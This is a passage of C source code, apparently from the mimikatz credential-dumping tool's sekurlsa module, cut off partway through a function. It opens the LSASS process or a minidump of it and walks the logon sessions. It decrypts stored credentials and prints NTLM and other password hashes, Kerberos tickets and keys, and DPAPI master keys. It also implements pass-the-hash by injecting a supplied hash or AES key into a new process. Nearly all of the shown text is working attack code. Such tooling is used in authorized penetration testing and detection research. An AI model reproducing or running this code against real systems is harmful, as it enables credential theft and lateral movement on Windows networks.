/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa.h"

const KUHL_M_C kuhl_m_c_sekurlsa[] = {
	{kuhl_m_sekurlsa_msv,		L"msv",				L"Lists LM & NTLM credentials"},
	{kuhl_m_sekurlsa_wdigest,	L"wdigest",			L"Lists WDigest credentials"},
	{kuhl_m_sekurlsa_kerberos,	L"kerberos",		L"Lists Kerberos credentials"},
	{kuhl_m_sekurlsa_tspkg,		L"tspkg",			L"Lists TsPkg credentials"},
	{kuhl_m_sekurlsa_livessp,	L"livessp",			L"Lists LiveSSP credentials"},
	{kuhl_m_sekurlsa_ssp,		L"ssp",				L"Lists SSP credentials"},
	{kuhl_m_sekurlsa_all,		L"logonPasswords",	L"Lists all available providers credentials"},

	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},

	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
	{kuhl_m_sekurlsa_credman,			L"credman",	L"List Credentials Manager"},
};

const KUHL_M kuhl_m_sekurlsa = {
	L"sekurlsa",	L"SekurLSA module",	L"Some commands to enumerate credentials...",
	ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
};

const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
	&kuhl_m_sekurlsa_msv_package,
	&kuhl_m_sekurlsa_tspkg_package,
	&kuhl_m_sekurlsa_wdigest_package,
	&kuhl_m_sekurlsa_livessp_package,
	&kuhl_m_sekurlsa_kerberos_package,
	&kuhl_m_sekurlsa_ssp_package,
	&kuhl_m_sekurlsa_dpapi_svc_package,
	&kuhl_m_sekurlsa_credman_package,
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_51), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_51, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager)},
};

const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
	{kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
#ifdef LSASS_DECRYPT
	{kuhl_m_sekurlsa_nt63_init,	kuhl_m_sekurlsa_nt63_clean,	kuhl_m_sekurlsa_nt63_acquireKeys,	&kuhl_m_sekurlsa_nt63_pLsaProtectMemory,&kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory},
#endif
};

const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}};
wchar_t * pMinidumpName = NULL;

VOID kuhl_m_sekurlsa_reset()
{
	HANDLE toClose;
	ULONG i;

	free(pMinidumpName);
	pMinidumpName = NULL;
	if(cLsass.hLsassMem)
	{
		switch(cLsass.hLsassMem->type)
		{
		case KULL_M_MEMORY_TYPE_PROCESS:
			toClose = cLsass.hLsassMem->pHandleProcess->hProcess;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS_DMP:
			toClose = cLsass.hLsassMem->pHandleProcessDmp->hMinidump;
			break;
		default:
			;
		}
		cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
		CloseHandle(toClose);
	}
	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
		RtlZeroMemory(&lsassPackages[i]->Module, sizeof(KUHL_M_SEKURLSA_LIB));
}

NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
{
	kprintf(L"Switch to PROCESS\n");
	kuhl_m_sekurlsa_reset();
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
{
	kprintf(L"Switch to MINIDUMP : ");
	if(argc != 1)
		PRINT_ERROR(L"<minidumpfile.dmp> argument is missing\n");
	else
	{
		kuhl_m_sekurlsa_reset();
		pMinidumpName = _wcsdup(argv[0]);
		kprintf(L"\'%s\'\n", pMinidumpName);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_init()
{
	lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
	#ifdef LSASS_DECRYPT
		((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
	#else
		&lsassLocalHelpers[1]
	#endif
		;
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_clean()
{
	return lsassLocalHelper->cleanLocalLib();
}

NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages));
}

NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	PMINIDUMP_SYSTEM_INFO pInfos;
	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
	BOOL isError = FALSE;

	if(!cLsass.hLsassMem)
	{
		status = STATUS_NOT_FOUND;
		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
		{
			if(pMinidumpName)
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			}
			else
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS;
				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
					hData = OpenProcess(processRights, FALSE, pid);
				else PRINT_ERROR(L"LSASS process not found (?)\n");
			}

			if(hData && hData != INVALID_HANDLE_VALUE)
			{
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;

							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion == 10))
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
						#ifdef _M_X64
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
						#elif defined _M_IX86
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
						#endif
						
						}
						else
						{
							isError = TRUE;
							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
						}
					}
					else
					{
						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
					}
					
					if(!isError)
					{
						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);

						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
						{
							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
							{
								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);

								if(!NT_SUCCESS(status))
									PRINT_ERROR(L"Key import\n");
							}
							else PRINT_ERROR(L"Logon list\n");
						}
						else PRINT_ERROR(L"Modules informations\n");
					}
				}
				else PRINT_ERROR(L"Memory opening\n");
			}
			else PRINT_ERROR_AUTO(L"Handle on memory");

			if(!NT_SUCCESS(status))
			{
				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
				CloseHandle(hData);
			}
		}
		else PRINT_ERROR(L"Local LSA library failed\n");
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
	{
		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
{
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &hLocalMemory}, aBuffer = {NULL, &hLocalMemory};
	BOOL retCallback = TRUE;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();

	if(NT_SUCCESS(status))
	{
		sessionData.cLsass = &cLsass;
		sessionData.lsassLocalHelper = lsassLocalHelper;

		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
			helper = &lsassEnumHelpers[0];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
			helper = &lsassEnumHelpers[1];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
			helper = &lsassEnumHelpers[2];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
			helper = &lsassEnumHelpers[3];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
			helper = &lsassEnumHelpers[5];
		else
			helper = &lsassEnumHelpers[6];

		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
			helper++; // yeah, really, I do that =)

		securityStruct.hMemory = cLsass.hLsassMem;
		if(securityStruct.address = LogonSessionListCount)
			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));

		for(i = 0; i < nbListes; i++)
		{
			securityStruct.address = &LogonSessionList[i];
			data.address = &pStruct;
			data.hMemory = &hLocalMemory;
			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
			{
				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
				{
					data.address = pStruct;
					data.hMemory = securityStruct.hMemory;

					while((data.address != securityStruct.address) && retCallback)
					{
						if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
						{
							sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToLogonType));
							sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToSession));
							sessionData.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
							sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
							sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
							sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);
							sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);

							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
							kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid, cLsass.hLsassMem);

							retCallback = callback(&sessionData, pOptionalData);

							LocalFree(sessionData.UserName->Buffer);
							LocalFree(sessionData.LogonDomain->Buffer);
							LocalFree(sessionData.pSid);

							data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
						}
						else break;
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
	ULONG i;
	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
	{
		kuhl_m_sekurlsa_printinfos_logonData(pData);
		for(i = 0; i < pLsassData->nbPackages; i++)
		{
			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
			{
				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
				kprintf(L"\n");
			}
		}
	}
	return TRUE;
}

const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	L"UndefinedLogonType",
	L"Unknown !",
	L"Interactive",
	L"Network",
	L"Batch",
	L"Service",
	L"Proxy",
	L"Unlock",
	L"NetworkCleartext",
	L"NewCredentials",
	L"RemoteInteractive",
	L"CachedInteractive",
	L"CachedRemoteInteractive",
	L"CachedUnlock",
};
void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	kprintf(L"\nAuthentication Id : %u ; %u (%08x:%08x)\n"
		L"Session           : %s from %u\n"
		L"User Name         : %wZ\n"
		L"Domain            : %wZ\n"
		L"SID               : "
		, pData->LogonId->HighPart, pData->LogonId->LowPart, pData->LogonId->HighPart, pData->LogonId->LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[pData->LogonType], pData->Session, pData->UserName, pData->LogonDomain);

	if(pData->pSid)
		kull_m_string_displaySID(pData->pSid);
	kprintf(L"\n");
}

NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages)
{
	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
}

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	TOKEN_STATISTICS tokenStats;
	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
	DWORD dwNeededSize;
	HANDLE hToken;
	PROCESS_INFORMATION processInfos;

	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		{
			kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\n", szUser, szDomain, szRun);

			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
			{
				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
				{
					if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
					{
						data.Aes128Key = aes128key;
						kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
					}
					else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
				}
				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
			}

			if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
			{
				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
				{
					if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
					{
						data.Aes256Key = aes256key;
						kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
					}
					else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
				}
				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
			}

			if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
			{
				if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
				{
					data.NtlmHash = ntlm;
					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				}
				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
			}
						
			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
			{
				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
				{
					kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
					{
						if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
						{
							kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
							kprintf(L"  \\_ msv1_0   - ");
							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
							kprintf(L"\n");
							kprintf(L"  \\_ kerberos - ");
							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
							kprintf(L"\n");
						}
						else PRINT_ERROR_AUTO(L"GetTokenInformation");
						CloseHandle(hToken);
					}
					else PRINT_ERROR_AUTO(L"OpenProcessToken");

					if(data.isReplaceOk)
						NtResumeProcess(processInfos.hProcess);
					else
						NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);

					CloseHandle(processInfos.hThread);
					CloseHandle(processInfos.hProcess);
				}
				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
			}
			else PRINT_ERROR(L"Missing at least one argument : ntlm OR aes128 OR aes256\n");
		}
		else PRINT_ERROR(L"Missing argument : domain\n");
	}
	else PRINT_ERROR(L"Missing argument : user\n");

	return STATUS_SUCCESS;
}

VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
{
	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10;
	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
	PKERB_HASHPASSWORD_GENERIC pHashPassword;
	UNICODE_STRING buffer;
	PVOID base;
	DWORD type, i;
	BOOL isNull = FALSE;
	
	if(mesCreds)
	{
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			credentials = (PUNICODE_STRING) mesCreds;
			if(credentials->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					(*lsassLocalHelper->pLsaUnprotectMemory)(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);

				switch(type)
				{
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);

					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
					if(pPrimaryCreds->isLmOwfPassword)
					{
						kprintf(L"\n\t * LM       : ");
						kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isNtOwfPassword)
					{
						kprintf(L"\n\t * NTLM     : ");
						kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isShaOwPassword)
					{
						kprintf(L"\n\t * SHA1     : ");
						kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					}
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);

					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
					kprintf(L"\n\t * Flags    : %02x/N%02x/L%02x/S%02x/%02x/%02x", pPrimaryCreds10->isUnk0, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword, pPrimaryCreds10->isUnk1, pPrimaryCreds10->isUnk2);
					if(pPrimaryCreds10->isLmOwfPassword)
					{
						kprintf(L"\n\t * LM       : ");
						kull_m_string_wprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds10->isNtOwfPassword)
					{
						kprintf(L"\n\t * NTLM     : ");
						kull_m_string_wprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds10->isShaOwPassword)
					{
						kprintf(L"\n\t * SHA1     : ");
						kull_m_string_wprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					}
					kprintf(L"\n\t * unknow   : ");
					for(i = 0; !isNull && (i < 128); i++)
						isNull |= !pPrimaryCreds10->UnkStruct[i];
					if(isNull)
						kprintf(L"[0..0]");
					else
						kull_m_string_wprintf_hex(pPrimaryCreds10->UnkStruct, 128, 0);
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
